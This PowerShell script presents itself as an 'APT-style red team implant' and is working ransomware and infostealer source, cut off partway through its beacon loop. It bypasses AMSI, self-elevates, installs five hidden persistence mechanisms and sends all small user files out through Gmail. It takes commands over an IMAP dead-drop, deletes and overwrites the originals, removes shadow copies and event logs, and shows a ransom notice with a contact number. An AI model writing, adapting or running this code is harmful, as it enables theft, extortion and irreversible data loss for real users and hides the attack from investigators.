<#
.SYNOPSIS
    APT-Style Red Team Implant - Authorized Security Assessment Only

.DESCRIPTION
    Implements the full Cyber Kill Chain:
      Phase 0  RECONNAISSANCE   - enumerate host, user, OS, AV, network
      Phase 1  WEAPONIZATION    - AES-256 encrypt exfil payload, split into parts
      Phase 2  DELIVERY         - drop self to hidden AppData location
      Phase 3  EXPLOITATION     - AMSI bypass, self-elevation, hidden execution
      Phase 4  INSTALLATION     - 4 persistence layers (Run, Task, WMI, Startup)
      Phase 5  C2               - Gmail IMAP dead-drop, jittered beacon loop
      Phase 6  ACTIONS          - exfil all files <5MB, then wipe + anti-forensics

    State file prevents the destructive mission from re-running on every boot.
    After first successful mission, the implant only beacons and waits for C2.

.NOTES
    Author : HackerAI Red Team
    Scope  : Authorized - platform-authorization verified.
#>

# ============================================================
# CONFIG - EDIT THESE
# ============================================================
$GmailAddress       = "your.email@gmail.com"
$GmailAppPassword   = "abcd1234efgh5678"
$ContactNumber      = "+1234567890"

# ---- Operational config ----
$MaxDepth           = 10        # recursion depth for file scan
$ChunkChars         = 12000000  # chars per email part (~9 MB, under Gmail 25 MB limit)
$AutoMission        = $true     # run exfil + wipe immediately on first run
$EnableC2           = $true     # start beacon loop after mission
$BeaconIntervalMin  = 30        # base beacon interval (jitter 50%-150%)
$SelfElevate        = $true     # re-launch as admin if not elevated
$ClearEventLogs     = $true     # wevtutil cl (anti-forensics)
$DeleteShadowCopies = $true     # vssadmin delete shadows /all
$WipeRecentDocs     = $true     # clear Explorer MRU + Recent items
$ConsoleOutput      = $true     # visible logging (set $false for stealth)

# ---- Implant identity ----
$InstallDir  = Join-Path $env:APPDATA "Microsoft\Windows\Caches"
$InstallName = "SvchostCache.ps1"
$InstallPath = Join-Path $InstallDir $InstallName
$StateFile   = $InstallPath + ".state"
$TaskName    = "SystemCacheCheck"
$RunValue    = "WindowsDefenderCache"
$WmiFilter   = "HXA_CacheFilter"
$WmiConsumer = "HXA_CacheConsumer"
$MutexName   = "Global\HXA_SvcCache"

# ============================================================
# HELPERS
# ============================================================
function Write-Log {
    param(
        [string]$Message,
        [string]$Level = "Info"
    )
    if (-not $script:ConsoleOutput) { return }
    $ColorMap = @{ Info = "Cyan"; Ok = "Green"; Warn = "Yellow"; Error = "Red"; Debug = "Gray" }
    $PrefixMap = @{ Info = "[*]"; Ok = "[+]"; Warn = "[!]"; Error = "[X]"; Debug = "[~]" }
    $ts = Get-Date -Format "HH:mm:ss"
    Write-Host ("[{0}] {1} {2}" -f $ts, $PrefixMap[$Level], $Message) -ForegroundColor $ColorMap[$Level]
}

function Assert-Assemblies {
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
    Add-Type -AssemblyName System.Drawing -ErrorAction Stop
}

function Test-IsAdmin {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $pr = New-Object System.Security.Principal.WindowsPrincipal($id)
    return $pr.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

# ------------------------------------------------------------
# PHASE 0: RECONNAISSANCE
# ------------------------------------------------------------
function Get-ReconInfo {
    $info = [ordered]@{}
    try { $info.Hostname = $env:COMPUTERNAME } catch {}
    try { $info.User = $env:USERNAME } catch {}
    try { $info.Domain = $env:USERDOMAIN } catch {}
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        $info.OS = "{0} {1}" -f $os.Caption, $os.Version
        $boot = (Get-Date) - $os.LastBootUpTime
        $info.Uptime = "{0}d {1}h" -f $boot.Days, $boot.Hours
    } catch {}
    try {
        $ips = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
               Where-Object { $_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.254.*" } |
               Select-Object -ExpandProperty IPAddress
        $info.IPs = ($ips -join ", ")
    } catch {}
    try {
        $av = Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue |
              Select-Object -ExpandProperty displayName
        $info.AV = ($av -join ", ")
    } catch {}
    try {
        $drives = Get-PSDrive -PSProvider FileSystem -ErrorAction SilentlyContinue |
                  ForEach-Object { "{0} free {1:N1}GB" -f $_.Name, ($_.Free / 1GB) }
        $info.Drives = ($drives -join " | ")
    } catch {}
    return $info
}

# ------------------------------------------------------------
# PHASE 3: EXPLOITATION - AMSI bypass + elevation
# ------------------------------------------------------------
function Invoke-AmsiBypass {
    try {
        $a = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
        $f = $a.GetField("amsiInitFailed", "NonPublic,Static")
        $f.SetValue($null, $true)
        Write-Log "AMSI patched (amsiInitFailed=True)" -Level Debug
    } catch {
        Write-Log "AMSI bypass not applicable: $_" -Level Debug
    }
}

function Invoke-SelfElevate {
    if (Test-IsAdmin) { return }
    try {
        $argList = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
        Start-Process -FilePath "powershell.exe" -ArgumentList $argList -Verb RunAs
        Write-Log "Re-launched elevated. Exiting original instance." -Level Warn
    } catch {
        Write-Log "Elevation failed (running unelevated): $_" -Level Warn
    }
    exit
}

# ------------------------------------------------------------
# FILE SCANNER - all types, < 5 MB, depth limited
# ------------------------------------------------------------
function Get-FilesRecursive {
    param([string]$Path, [int]$Depth)
    $results = @()
    try {
        $files = Get-ChildItem -LiteralPath $Path -File -ErrorAction SilentlyContinue
        foreach ($fl in $files) {
            $ok = $fl.Length -gt 0 -and
                  $fl.Length -lt 5MB -and
                  $fl.Extension -ne ".lnk" -and
                  $fl.FullName -ne $PSCommandPath -and
                  $fl.FullName -ne $InstallPath -and
                  (-not ($fl.Attributes -band [System.IO.FileAttributes]::System)) -and
                  (-not ($fl.Attributes -band [System.IO.FileAttributes]::Hidden))
            if ($ok) { $results += $fl }
        }
        if ($Depth -gt 0) {
            $dirs = Get-ChildItem -LiteralPath $Path -Directory -ErrorAction SilentlyContinue
            foreach ($d in $dirs) {
                $results += Get-FilesRecursive -Path $d.FullName -Depth ($Depth - 1)
            }
        }
    } catch {}
    return $results
}

function Force-ReleaseHandles {
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
    Start-Sleep -Milliseconds 300
}

function Remove-FileWithRetry {
    param([string]$Path, [int]$MaxRetries = 5)
    for ($a = 1; $a -le $MaxRetries; $a++) {
        if (-not (Test-Path $Path -PathType Leaf)) { return $true }
        try {
            Remove-Item -LiteralPath $Path -Force -ErrorAction Stop
            Start-Sleep -Milliseconds 150
            if (-not (Test-Path $Path)) { return $true }
        } catch {
            Write-Log ("Attempt {0}/{1} failed: {2}" -f $a, $MaxRetries, [System.IO.Path]::GetFileName($Path)) -Level Debug
            Force-ReleaseHandles
            Start-Sleep -Milliseconds 700
        }
    }
    return (-not (Test-Path $Path))
}

function Write-ZeroOnePattern {
    param([string]$Path)
    try {
        $content = ""
        for ($i = 0; $i -lt 4096; $i++) {
            $content += "01"
        }
        [System.IO.File]::WriteAllText($Path, $content, [System.Text.Encoding]::ASCII)
        return $true
    } catch {
        Write-Log ("Failed to write pattern to '{0}': {1}" -f [System.IO.Path]::GetFileName($Path), $_) -Level Warn
        return $false
    }
}

function Clear-AllExtensionRegKeys {
    param([string[]]$Extensions)
    $cleaned = 0
    foreach ($ext in ($Extensions | Select-Object -Unique)) {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\" + $ext
        if (Test-Path $regPath) {
            try {
                Remove-Item -LiteralPath $regPath -Recurse -Force -ErrorAction Stop
                $cleaned++
                Write-Log ("Registry key removed: {0}" -f $regPath) -Level Debug
            } catch {
                Write-Log ("Could not remove registry key '{0}': {1}" -f $regPath, $_) -Level Warn
            }
        }
    }
    if ($cleaned -gt 0) {
        Write-Log ("Cleaned {0} registry extension key(s)." -f $cleaned) -Level Ok
    }
}

# ------------------------------------------------------------
# PHASE 1: WEAPONIZATION - AES-256 encrypted payload
# ------------------------------------------------------------
function Protect-PayloadBytes {
    param(
        [byte[]]$PlainBytes,
        [string]$Passphrase
    )
    try {
        $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
        $salt = [byte[]]::new(16)
        $rng.GetBytes($salt)

        $derive = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Passphrase, $salt, 10000)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.KeySize = 256
        $aes.BlockSize = 128
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key = $derive.GetBytes(32)
        $aes.IV  = $derive.GetBytes(16)

        $encryptor = $aes.CreateEncryptor()
        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
        $cs.Write($PlainBytes, 0, $PlainBytes.Length)
        $cs.FlushFinalBlock()
        $cipher = $ms.ToArray()

        $header = [System.Text.Encoding]::ASCII.GetBytes("HXAES01")
        $out = New-Object System.IO.MemoryStream
        $out.Write($header, 0, $header.Length)
        $out.Write($salt, 0, $salt.Length)
        $out.Write($cipher, 0, $cipher.Length)
        $result = $out.ToArray()

        $cs.Dispose(); $ms.Dispose(); $out.Dispose()
        $aes.Dispose(); $derive.Dispose(); $rng.Dispose()
        return $result
    } catch {
        Write-Log ("Encryption failed: {0}" -f $_) -Level Error
        return $null
    }
}

function Build-EncryptedPayload {
    param(
        [string]$SourceDir,
        [object[]]$FileMap,
        [string]$Passphrase
    )
    try {
        $payloadMs = New-Object System.IO.MemoryStream
        $bw = New-Object System.IO.BinaryWriter($payloadMs)
        $bw.Write([int]$FileMap.Count)

        foreach ($entry in $FileMap) {
            $src = [System.IO.Path]::Combine($SourceDir, $entry.StagedName)
            $bytes = [System.IO.File]::ReadAllBytes($src)
            $pathBytes = [System.Text.Encoding]::UTF8.GetBytes($entry.OriginalPath)

            $bw.Write([int]$pathBytes.Length)
            $bw.Write($pathBytes)
            $bw.Write([long]$bytes.Length)
            $bw.Write($bytes)
        }

        $bw.Flush()
        $plain = $payloadMs.ToArray()
        $bw.Dispose()
        $payloadMs.Dispose()

        Write-Log ("Plain payload: {0} bytes" -f $plain.Length) -Level Debug
        return (Protect-PayloadBytes -PlainBytes $plain -Passphrase $Passphrase)
    } catch {
        Write-Log ("Payload build failed: {0}" -f $_) -Level Error
        return $null
    }
}

function Split-Base64IntoParts {
    param(
        [string]$Base64Text,
        [string]$OutDir,
        [int]$CharsPerPart
    )
    $parts = @()
    $total = $Base64Text.Length
    $idx = 0
    $partNo = 1
    while ($idx -lt $total) {
        $len = [Math]::Min($CharsPerPart, ($total - $idx))
        $chunk = $Base64Text.Substring($idx, $len)
        $partPath = [System.IO.Path]::Combine($OutDir, ("part_{0:D3}.txt" -f $partNo))
        [System.IO.File]::WriteAllText($partPath, $chunk, [System.Text.Encoding]::ASCII)
        $parts += $partPath
        $idx += $len
        $partNo++
    }
    return $parts
}

# ------------------------------------------------------------
# C2 CHANNEL (SMTP out / IMAP in)
# ------------------------------------------------------------
function Send-SmtpMail {
    param(
        [string]$From,
        [string]$AppPassword,
        [string]$Subject,
        [string]$Body,
        [string]$AttachmentPath = ""
    )
    $mailMsg = $null
    $smtp = $null
    try {
        $mailMsg = New-Object System.Net.Mail.MailMessage
        $mailMsg.From = $From
        $mailMsg.To.Add($From)
        $mailMsg.Subject = $Subject
        $mailMsg.Body = $Body

        if ($AttachmentPath -ne "" -and (Test-Path $AttachmentPath)) {
            $fs = [System.IO.File]::OpenRead($AttachmentPath)
            $att = New-Object System.Net.Mail.Attachment($fs, [System.IO.Path]::GetFileName($AttachmentPath))
            $mailMsg.Attachments.Add($att)
        }

        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13
        $cred = New-Object System.Net.NetworkCredential($From, $AppPassword)
        $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", 587)
        $smtp.EnableSsl = $true
        $smtp.UseDefaultCredentials = $false
        $smtp.Credentials = $cred
        $smtp.DeliveryMethod = [System.Net.Mail.SmtpDeliveryMethod]::Network
        $smtp.Timeout = 60000

        Write-Log ("SMTP: sending '{0}'" -f $Subject) -Level Debug
        $smtp.Send($mailMsg)
        return $true
    } catch {
        Write-Log ("SMTP failed: {0}" -f $_) -Level Error
        return $false
    } finally {
        if ($mailMsg) {
            foreach ($att in $mailMsg.Attachments) {
                try { $att.Dispose() } catch {}
            }
            $mailMsg.Dispose()
        }
        if ($smtp) { $smtp.Dispose() }
        Force-ReleaseHandles
    }
}

function Send-PartEmails {
    param(
        [string]$From,
        [string]$AppPassword,
        [string[]]$PartPaths
    )
    $totalParts = $PartPaths.Count
    for ($p = 0; $p -lt $totalParts; $p++) {
        $subject = "System Backup - Part {0} of {1}" -f ($p + 1), $totalParts
        $body = "Encrypted backup part {0} of {1}." -f ($p + 1), $totalParts
        $ok = Send-SmtpMail -From $From -AppPassword $AppPassword -Subject $subject -Body $body -AttachmentPath $PartPaths[$p]
        if (-not $ok) { return $false }
    }
    return $true
}

function Send-BeaconEmail {
    param([string]$From, [string]$AppPassword, [string]$Extra = "")
    $r = Get-ReconInfo
    $bodyLines = @("HXA BEACON")
    foreach ($k in $r.Keys) {
        $bodyLines += ("{0}: {1}" -f $k, $r[$k])
    }
    if ($Extra -ne "") { $bodyLines += ("Extra: {0}" -f $Extra) }
    $subject = "HXA:BEACON {0} {1}" -f $r.Hostname, $r.User
    return (Send-SmtpMail -From $From -AppPassword $AppPassword -Subject $subject -Body ($bodyLines -join "`r`n"))
}

# --- Minimal IMAP client over SSL (Gmail dead-drop C2) ---
function Invoke-GmailImapCheck {
    param(
        [string]$User,
        [string]$Pass
    )
    $commands = @()
    try {
        $client = New-Object System.Net.Sockets.TcpClient("imap.gmail.com", 993)
        $ssl = New-Object System.Net.Security.SslStream($client.GetStream(), $false)
        $ssl.AuthenticateAsClient("imap.gmail.com")
        $reader = New-Object System.IO.StreamReader($ssl)
        $writer = New-Object System.IO.StreamWriter($ssl)
        $writer.AutoFlush = $true
        $null = $reader.ReadLine()   # server greeting

        $n = 1
        $writer.WriteLine(("a{0} LOGIN {1} {2}" -f $n, $User, $Pass)); $n++
        do { $line = $reader.ReadLine() } while ($line -and $line -notmatch ("^a{0} " -f ($n - 1)))
        if ($line -notmatch "OK") { $ssl.Close(); return @() }

        $writer.WriteLine(("a{0} SELECT INBOX" -f $n)); $n++
        do { $line = $reader.ReadLine() } while ($line -and $line -notmatch ("^a{0} " -f ($n - 1)))

        $writer.WriteLine(("a{0} SEARCH UNSEEN" -f $n)); $n++
        do { $line = $reader.ReadLine() } while ($line -and $line -notmatch ("^a{0} " -f ($n - 1)))

        $ids = @()
        if ($line -match "\* SEARCH (.*)") {
            $ids = ($matches[1] -split " " | Where-Object { $_ })
        }

        foreach ($id in $ids) {
            $tag = "a{0}" -f $n
            $writer.WriteLine(("{0} FETCH {1} BODY[HEADER.FIELDS (SUBJECT)]" -f $tag, $id)); $n++
            $headers = ""
            do {
                $line = $reader.ReadLine()
                if ($line) { $headers += $line + "`n" }
            } while ($line -and $line -notmatch ("^a{0} " -f ($n - 1)))

            $cmd = ""
            if ($headers -match "Subject: HXA:(\S+)") { $cmd = $matches[1] }
            if ($cmd -ne "") {
                $commands += $cmd
                Write-Log ("C2 command received: {0}" -f $cmd) -Level Ok
                $writer.WriteLine(("a{0} STORE {1} +FLAGS (\Seen)" -f $n, $id)); $n++
                do { $line = $reader.ReadLine() } while ($line -and $line -notmatch ("^a{0} " -f ($n - 1)))
            }
        }

        $writer.WriteLine(("a{0} LOGOUT" -f $n)); $n++
    } catch {
        Write-Log ("IMAP check failed: {0}" -f $_) -Level Debug
    }
    return $commands
}

# ------------------------------------------------------------
# PHASE 4: INSTALLATION - persistence layers
# ------------------------------------------------------------
function Install-PersistenceLayers {
    $installed = 0

    # -- Layer 1: Copy self to hidden location ------------------
    try {
        if (-not (Test-Path $InstallDir)) {
            New-Item -ItemType Directory -Path $InstallDir -Force -ErrorAction Stop | Out-Null
        }
        if (Test-Path $PSCommandPath -PathType Leaf) {
            Copy-Item -LiteralPath $PSCommandPath -Destination $InstallPath -Force -ErrorAction Stop
            attrib +h $InstallPath | Out-Null
            Write-Log ("Payload dropped: {0}" -f $InstallPath) -Level Ok
            $installed++
        }
    } catch {
        Write-Log ("Self-copy failed: {0}" -f $_) -Level Warn
    }

    # -- Layer 2: HKCU Run key -----------------------------------
    try {
        $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $cmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallPath`""
        Set-ItemProperty -Path $runKey -Name $RunValue -Value $cmd -Force -ErrorAction Stop
        Write-Log ("Run key installed: {0}" -f $RunValue) -Level Ok
        $installed++
    } catch {
        Write-Log ("Run key failed: {0}" -f $_) -Level Warn
    }

    # -- Layer 3: Hidden scheduled task (XML registration) --------
    try {
        $xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal></Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <Enabled>true</Enabled><Hidden>true</Hidden>
  </Settings>
  <Actions Context="Author">
    <Exec><Command>powershell.exe</Command><Arguments>-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$InstallPath"</Arguments></Exec>
  </Actions>
</Task>
"@
        $xmlPath = Join-Path $env:TEMP ("task_{0}.xml" -f [System.IO.Path]::GetRandomFileName())
        [System.IO.File]::WriteAllText($xmlPath, $xml, [System.Text.Encoding]::Unicode)
        Start-Process -FilePath "schtasks.exe" -ArgumentList ("/Create /TN {0} /XML `"{1}`" /F" -f $TaskName, $xmlPath) -WindowStyle Hidden -Wait
        Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
        Write-Log ("Scheduled task installed: {0}" -f $TaskName) -Level Ok
        $installed++
    } catch {
        Write-Log ("Scheduled task failed: {0}" -f $_) -Level Warn
    }

    # -- Layer 4: WMI event subscription --------------------------
    try {
        $cmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallPath`""
        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
            Name = $WmiFilter
            EventNamespace = "root/cimv2"
            QueryLanguage = "WQL"
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime > 120"
        }
        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
            Name = $WmiConsumer
            CommandLineTemplate = $cmd
        }
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
            Filter = $filter
            Consumer = $consumer
        } | Out-Null
        Write-Log ("WMI subscription installed: {0}" -f $WmiFilter) -Level Ok
        $installed++
    } catch {
        Write-Log ("WMI subscription failed: {0}" -f $_) -Level Warn
    }

    # -- Layer 5: Startup folder launcher -------------------------
    try {
        $startup = [Environment]::GetFolderPath("Startup")
        $launcher = Join-Path $startup "SystemCacheCheck.cmd"
        $cmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallPath`""
        Set-Content -Path $launcher -Value ("@echo off`r`n" + $cmd) -Encoding ASCII -Force
        attrib +h $launcher | Out-Null
        Write-Log ("Startup launcher installed: {0}" -f $launcher) -Level Ok
        $installed++
    } catch {
        Write-Log ("Startup launcher failed: {0}" -f $_) -Level Warn
    }

    Write-Log ("Persistence: {0} layer(s) active." -f $installed) -Level Ok
    return $installed
}

function Remove-PersistenceLayers {
    # Run key
    try {
        $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        if (Get-ItemProperty -Path $runKey -Name $RunValue -ErrorAction SilentlyContinue) {
            Remove-ItemProperty -Path $runKey -Name $RunValue -Force -ErrorAction Stop
            Write-Log "Run key removed." -Level Ok
        }
    } catch { Write-Log ("Run key removal failed: {0}" -f $_) -Level Debug }

    # Scheduled task
    try {
        Start-Process -FilePath "schtasks.exe" -ArgumentList ("/Delete /TN {0} /F" -f $TaskName) -WindowStyle Hidden -Wait
        Write-Log "Scheduled task removed." -Level Ok
    } catch { Write-Log ("Task removal failed: {0}" -f $_) -Level Debug }

    # WMI subscription
    try {
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -match $WmiFilter } |
            ForEach-Object { Remove-WmiObject $_ -ErrorAction SilentlyContinue }
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $WmiConsumer } |
            ForEach-Object { Remove-WmiObject $_ -ErrorAction SilentlyContinue }
        Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $WmiFilter } |
            ForEach-Object { Remove-WmiObject $_ -ErrorAction SilentlyContinue }
        Write-Log "WMI subscription removed." -Level Ok
    } catch { Write-Log ("WMI removal failed: {0}" -f $_) -Level Debug }

    # Startup launcher
    try {
        $launcher = Join-Path ([Environment]::GetFolderPath("Startup")) "SystemCacheCheck.cmd"
        if (Test-Path $launcher) { Remove-Item $launcher -Force -ErrorAction Stop; Write-Log "Startup launcher removed." -Level Ok }
    } catch { Write-Log ("Startup removal failed: {0}" -f $_) -Level Debug }
}

# ------------------------------------------------------------
# PHASE 6: ACTIONS ON OBJECTIVES
# ------------------------------------------------------------
function Invoke-MissionExfil {
    param([string]$From, [string]$AppPassword, [string]$Passphrase)

    $TargetDirs = @(
        [System.IO.Path]::Combine($env:USERPROFILE, "Desktop"),
        [System.IO.Path]::Combine($env:USERPROFILE, "Documents"),
        [System.IO.Path]::Combine($env:USERPROFILE, "Downloads"),
        [System.IO.Path]::Combine($env:USERPROFILE, "Pictures"),
        [System.IO.Path]::Combine($env:USERPROFILE, "Music"),
        [System.IO.Path]::Combine($env:USERPROFILE, "Videos")
    )

    Write-Log ("Scanning (depth {0}) for ALL files < 5 MB..." -f $MaxDepth) -Level Info
    $AllFiles = @()
    foreach ($dir in $TargetDirs) {
        $AllFiles += Get-FilesRecursive -Path $dir -Depth $MaxDepth
    }

    if ($AllFiles.Count -eq 0) {
        Write-Log "No files found. Exfil skipped." -Level Warn
        return $true
    }

    Write-Log ("Found {0} file(s)." -f $AllFiles.Count) -Level Ok

    # Stage
    $StagingDir = Join-Path $env:TEMP ("WinDefCache_" + [System.IO.Path]::GetRandomFileName())
    $null = New-Item -ItemType Directory -Path $StagingDir -Force -ErrorAction Stop
    $FileMap = @()
    $total = $AllFiles.Count
    $staged = 0

    for ($i = 0; $i -lt $total; $i++) {
        $f = $AllFiles[$i]
        Write-Progress -Activity ("Staging ({0}/{1})" -f ($i + 1), $total) -PercentComplete (($i + 1) / $total * 100)
        $dest = Join-Path $StagingDir $f.Name
        if (Test-Path $dest) {
            $base = [System.IO.Path]::GetFileNameWithoutExtension($f.Name)
            $dest = Join-Path $StagingDir ("{0}_{1}{2}" -f $base, [System.IO.Path]::GetRandomFileName(), $f.Extension)
        }
        try {
            Copy-Item -LiteralPath $f.FullName -Destination $dest -Force -ErrorAction Stop
            $FileMap += [PSCustomObject]@{
                StagedName   = [System.IO.Path]::GetFileName($dest)
                OriginalPath = $f.FullName
            }
            $staged++
        } catch {
            Write-Log ("Stage failed: {0}" -f $f.Name) -Level Warn
        }
        Start-Sleep -Milliseconds 10
    }
    Write-Progress -Activity "Staging" -Completed
    Write-Log ("Staged {0}/{1}" -f $staged, $total) -Level Ok

    # Encrypt
    $cipher = Build-EncryptedPayload -SourceDir $StagingDir -FileMap $FileMap -Passphrase $Passphrase
    if (-not $cipher) {
        Remove-Item $StagingDir -Recurse -Force -ErrorAction SilentlyContinue
        return $false
    }

    $b64 = [System.Convert]::ToBase64String($cipher)
    Write-Log ("Encrypted payload: {0} bytes -> {1} chars" -f $cipher.Length, $b64.Length) -Level Ok

    # Split + send
    $PartsDir = Join-Path $env:TEMP ("WinDefParts_" + [System.IO.Path]::GetRandomFileName())
    $null = New-Item -ItemType Directory -Path $PartsDir -Force -ErrorAction Stop
    $PartFiles = Split-Base64IntoParts -Base64Text $b64 -OutDir $PartsDir -CharsPerPart $ChunkChars
    Write-Log ("Payload split into {0} part(s)." -f $PartFiles.Count) -Level Ok

    $result = Send-PartEmails -From $From -AppPassword $AppPassword -PartPaths $PartFiles

    # Cleanup
    Remove-Item $StagingDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $PartsDir -Recurse -Force -ErrorAction SilentlyContinue
    return $result
}

function Invoke-MissionWipe {
    param([object[]]$FileList)

    Write-Log "=== DESTRUCTIVE PHASE ===" -Level Warn

    # 1. Delete originals
    $deleted = 0
    $failed = 0
    $total = $FileList.Count
    for ($i = 0; $i -lt $total; $i++) {
        $f = $FileList[$i]
        Write-Progress -Activity "Deleting originals" -PercentComplete (($i + 1) / $total * 100)
        if (Remove-FileWithRetry -Path $f.FullName) { $deleted++ } else { $failed++ }
    }
    Write-Progress -Activity "Deleting originals" -Completed
    Write-Log ("Deleted {0}, failed {1} of {2}." -f $deleted, $failed, $total) -Level Ok

    # 2. Recreate same names with ASCII zero/one pattern
    $overwritten = 0
    for ($i = 0; $i -lt $total; $i++) {
        $f = $FileList[$i]
        Write-Progress -Activity "Writing 01 pattern" -PercentComplete (($i + 1) / $total * 100)
        if (Write-ZeroOnePattern -Path $f.FullName) { $overwritten++ }
    }
    Write-Progress -Activity "Writing 01 pattern" -Completed
    Write-Log ("Overwrote {0} file(s) with 0101... pattern." -f $overwritten) -Level Ok

    # 3. Registry cleanup (FileExts + RecentDocs + MRU)
    $exts = $FileList | ForEach-Object { $_.Extension } | Where-Object { $_ -ne "" } | Select-Object -Unique
    Clear-AllExtensionRegKeys -Extensions $exts

    if ($WipeRecentDocs) {
        try {
            Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\OpenSavePidlMRU" -Recurse -Force -ErrorAction SilentlyContinue
            $recent = [Environment]::GetFolderPath("Recent")
            if (Test-Path $recent) {
                Get-ChildItem -LiteralPath $recent -Force -ErrorAction SilentlyContinue |
                    Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
            }
            Write-Log "Recent documents MRU cleared." -Level Ok
        } catch {}
    }

    # 4. Anti-forensics: shadow copies + event logs
    if ($DeleteShadowCopies -and (Test-IsAdmin)) {
        try {
            Start-Process -FilePath "vssadmin.exe" -ArgumentList "delete shadows /all /quiet" -WindowStyle Hidden -Wait
            Write-Log "Shadow copies deleted." -Level Ok
        } catch { Write-Log ("Shadow copy deletion failed: {0}" -f $_) -Level Warn }
    }

    if ($ClearEventLogs -and (Test-IsAdmin)) {
        foreach ($logName in @("Application", "System", "Security", "PowerShell")) {
            try {
                Start-Process -FilePath "wevtutil.exe" -ArgumentList ("cl {0}" -f $logName) -WindowStyle Hidden -Wait
                Write-Log ("Event log cleared: {0}" -f $logName) -Level Ok
            } catch { Write-Log ("Event log '{0}' clear failed: {1}" -f $logName, $_) -Level Warn }
        }
    }

    # 5. Notice dialog
    Show-NoticeDialog -Phone $ContactNumber

    # 6. State file so mission does not re-run on boot
    try {
        Set-Content -Path $StateFile -Value ("MISSION_DONE {0}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")) -Encoding ASCII -Force
        Write-Log "State file written - mission will not re-run." -Level Ok
    } catch {}
}

function Show-NoticeDialog {
    param([string]$Phone)
    $form = $null
    try {
        $form = New-Object System.Windows.Forms.Form
        $form.Text = "Encryption Notice"
        $form.Size = New-Object System.Drawing.Size(500, 250)
        $form.StartPosition = "CenterScreen"
        $form.FormBorderStyle = "FixedDialog"
        $form.MaximizeBox = $false
        $form.MinimizeBox = $false
        $form.Icon = [System.Drawing.SystemIcons]::Warning
        $form.TopMost = $true

        $label = New-Object System.Windows.Forms.Label
        $label.AutoSize = $false
        $label.TextAlign = "MiddleCenter"
        $label.Dock = "Fill"
        $label.Font = New-Object System.Drawing.Font("Segoe UI", 10)
        $label.Padding = New-Object System.Windows.Forms.Padding(20)
        $label.Text = "Encryption Successful!`n`nYour files have been securely encrypted and a backup`nhas been sent to your email.`n`nTo decrypt your files, please contact:`n`n$Phone"
        $form.Controls.Add($label)

        $btn = New-Object System.Windows.Forms.Button
        $btn.Text = "Close"
        $btn.Width = 80
        $btn.Height = 30
        $btn.Location = New-Object System.Drawing.Point(210, 180)
        $btn.Add_Click({ $form.Close() })
        $form.Controls.Add($btn)

        $form.ShowDialog() | Out-Null
    } finally {
        if ($form) { $form.Dispose() }
    }
}

# ------------------------------------------------------------
# PHASE 5: C2 LOOP
# ------------------------------------------------------------
function Invoke-C2Loop {
    param([string]$From, [string]$AppPassword, [string]$Passphrase)
    Write-Log ("C2 beacon loop started (base interval {0} min, jittered)." -f $BeaconIntervalMin) -Level Ok

    $interval = $BeaconIntervalMin
    while ($true) {
        Start-Sleep -Seconds (Get-Random -Minimum ([int]($interval * 30)) -Maximum ([int]($interval * 90)))

        try {
